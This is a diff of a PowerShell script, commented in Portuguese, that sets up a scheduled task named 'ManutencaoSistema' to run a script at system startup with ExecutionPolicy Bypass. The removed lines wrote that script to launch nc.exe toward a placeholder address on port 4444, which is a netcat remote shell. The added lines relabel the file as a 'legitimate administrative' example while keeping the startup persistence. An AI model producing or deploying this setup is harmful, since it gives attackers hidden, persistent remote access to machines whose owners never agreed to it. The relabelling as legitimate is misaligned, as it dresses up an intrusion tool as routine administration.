@@ -1,25 +1,12 @@
-# Código corrigido sem o parâmetro Hidden
+# Exemplo de provisionamento de script administrativo legítimo
 $TaskName = "ManutencaoSistema"
 $ScriptPath = "C:\ProgramData\Scripts\amigo.ps1"
 
-# Criação do script com logging
-$scriptContent = @"
-Start-Transcript -Path "$env:TEMP\debug.log" -Append
-try {
-    # Seu payload aqui
-    Write-Output "Conectando via netcat..."
-    Start-Process -FilePath 'nc.exe' -ArgumentList '-nv ip_destino 4444'
-} catch {
-    Write-Output "Erro: $_"
-} finally {
-    Stop-Transcript
-}
-"@
+# Define a ação apontando diretamente para o interpretador e o arquivo
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $ScriptPath"
 
-Set-Content -Path $ScriptPath -Value $scriptContent
+# MODIFICADO: Define o gatilho para iniciar logo ao ligar/inicializar o PC
+$Trigger = New-ScheduledTaskTrigger -AtStartup
 
-# Registro da tarefa com configurações apropriadas
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $ScriptPath"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-$settings = New-ScheduledTaskSettingsSet -RunLevel Highest
-Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings
+# Registra a tarefa no escopo do sistema
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger
